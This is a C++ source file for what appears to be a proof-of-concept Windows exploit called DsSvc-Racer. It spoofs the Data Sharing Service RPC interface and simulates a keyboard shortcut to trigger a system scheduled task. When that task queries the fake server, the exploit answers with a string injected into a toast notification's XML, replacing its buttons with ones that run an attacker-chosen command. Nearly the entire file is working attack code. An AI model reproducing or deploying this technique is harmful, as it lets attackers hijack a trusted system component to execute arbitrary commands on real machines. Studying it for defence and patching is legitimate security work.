#include "DsSvc-Racer.h"

void PressKey(WORD vk, bool keyDown)
{
	INPUT input = { 0 };
	input.type = INPUT_KEYBOARD;
	input.ki.wVk = vk;
	input.ki.dwFlags = keyDown ? 0 : KEYEVENTF_KEYUP;
	if (!SendInput(1, &input, sizeof(INPUT)))
		wcout << L"failed" << endl;
}

void LaunchTask()
{
	wcout << L"Sending input Win+Ctrl+Shift+T" << endl;

	// Simulate key down: Win + Ctrl + Shift + T
	PressKey(VK_LWIN, true);
	PressKey(VK_CONTROL, true);
	PressKey(VK_SHIFT, true);
	PressKey('T', true);

	// Small delay
	Sleep(50);

	// Simulate key up: T + Shift + Ctrl + Win
	PressKey('T', false);
	PressKey(VK_SHIFT, false);
	PressKey(VK_CONTROL, false);
	PressKey(VK_LWIN, false);
}

void PrintHelp()
{
	wcout << "usage: DsSvc-Racer.exe COMMAND" << endl;
}

int wmain(int argc, wchar_t* argv[])
{
	try
	{
		wstring param1;
		switch (argc)
		{
		case 1:
			PrintHelp();
			return EXIT_SUCCESS;
		case 2:
			param1 = argv[1];
			break;
		default:
			param1 = argv[1];
		}

		if (!param1.compare(L"-h") || !param1.compare(L"--help"))
		{
			PrintHelp();
			return EXIT_SUCCESS;
		}

		// The first parameter is the command to be executed by the notification
		g_Command = param1;

		wchar_t protseq[] = PROTSEC;
		RegisterServer(DsSvc_v1_0_s_ifspec, protseq, nullptr, nullptr);
		wstring serviceName = L"DsSvc";
		QueryStatusService(serviceName);
		
		// Launch the scheduled task \Microsoft\Windows\PerformanceTrace\RequestTrace by simulating key presses
		// the task will will ask our server for a string that will be inserted into an XML that configures the properties of a notification popup. 
		// We will return to it a string the changes the properties of the notification. 
		// It hides the buttons set by the scheduled task and adds a button that performs an action of our choosing upon clicking it
		LaunchTask();
		RPC_STATUS rpcStatus = RpcServerListen(1, RPC_C_LISTEN_MAX_CALLS_DEFAULT, FALSE);
		if (RPC_S_OK != rpcStatus)
			ThrowException("RpcServerListen failed", rpcStatus);
	}
	catch (std::exception& ex)
	{
		cout << ex.what() << endl;
	}
	catch (...)
	{
		cout << "Unknown exception occured" << endl;
	}
	cout << "Done" << endl;
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
	free(ptr);
}

void CopyStrToWchar(const wstring& Str, wchar_t** Ptr)
{
	int strSize = Str.size() + 1;
	*Ptr = (wchar_t*)midl_user_allocate(strSize * sizeof(wchar_t));
	wcscpy_s(*Ptr, strSize, Str.c_str());
}

long RpcDSSCreateSharedFileToken(
	/* [in] */ handle_t IDL_handle,
	/* [string][in] */ wchar_t* filepath,
	/* [in] */ PDS_SHARE_ACCESS_CONTROL access_control,
	DS_TOKEN_LIFETIME_TYPE token_lifetime,
	DS_TOKEN_USAGE token_usage,
	/* [string][ref][out] */ wchar_t** token) {
	g_SharedFilePath = filepath;
	wcout << L"CreateSharedFileToken for " << g_SharedFilePath << endl;
	
	// The buffer will contain the string the will be injected to the XML of the toast
	DWORD bufferSize = INJECTION_FORMAT_STRING.size();

	// the command will be applied to 2 buttons
	bufferSize += g_Command.size() * 2;

	// add size of null terminator
	bufferSize += 1;

	wchar_t* buffer = new wchar_t[bufferSize];
	swprintf(buffer, bufferSize, INJECTION_FORMAT_STRING.c_str(), g_Command.c_str(), g_Command.c_str());
	wstring injectedXML = buffer;
	delete[] buffer;
	CopyStrToWchar(injectedXML, token);
	return S_OK;
}

long RpcDSSGetSharedFileName(
	/* [in] */ handle_t IDL_handle,
	/* [string][in] */ wchar_t* token,
	/* [string][ref][out] */ wchar_t** file_name) {
	wcout << L"GetSharedFileName for " << token << endl;
	CopyStrToWchar(g_SharedFilePath, file_name);
	return S_OK;
}

long RpcDSSGetSharingTokenInformation(
	/* [in] */ handle_t IDL_handle,
	/* [string][in] */ wchar_t* token,
	/* [string][ref][out] */ wchar_t** filepath,
	/* [string][ref][out] */ wchar_t** user_sid,
	/* [ref][out] */ PDS_SHARE_PERMISSION share_permission) {
	wcout << L"GetSharingTokenInformation for " << token << endl;
	CopyStrToWchar(g_SharedFilePath, filepath);
	HANDLE threadToken = GetRpcClientToken(IDL_handle);
	if (nullptr == threadToken)
		return RPC_S_BINDING_HAS_NO_AUTH;

	wstring username;
	wstring sid;
	GetSidAndUsername(threadToken, sid, username);
	CloseHandle(threadToken);
	CopyStrToWchar(sid, user_sid);
	*share_permission = DS_SHARE_PERMISSION_ReadWrite;
	return 0;
}

long RpcDSSDelegateSharingToken(
	/* [in] */ handle_t IDL_handle,
	/* [string][in] */ wchar_t* token,
	/* [in] */ PDS_SHARE_ACCESS_CONTROL access_control) {
	wcout << L"DelegateSharingToken for " << token << endl;
	return 0;
}

long RpcDSSRemoveSharingToken(
	/* [in] */ handle_t IDL_handle,
	/* [string][in] */ wchar_t* token) {
	wcout << L"RemoveSharingToken for " << token << endl;
	return 0;
}

long RpcDSSOpenSharedFile(
	/* [in] */ handle_t IDL_handle,
	/* [string][in] */ wchar_t* token,
	/* [in] */ DS_OPEN_FLAGS flags,
	/* [out] */ hyper* file_handle) {
	wcout << L"OpenSharedFile for " << token << endl;
	*file_handle = 0;
	return 0;
}

long RpcDSSCopyFromSharedFile(
	/* [in] */ handle_t IDL_handle,
	/* [string][in] */ wchar_t* token,
	/* [string][in] */ wchar_t* dest_file) {
	wcout << L"CopyFromSharedFile from " << token << L" to " << dest_file << endl;
	return 0;
}

long RpcDSSRemoveExpiredTokens(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"RemoveExpiredTokens" << endl;
	return 0;
}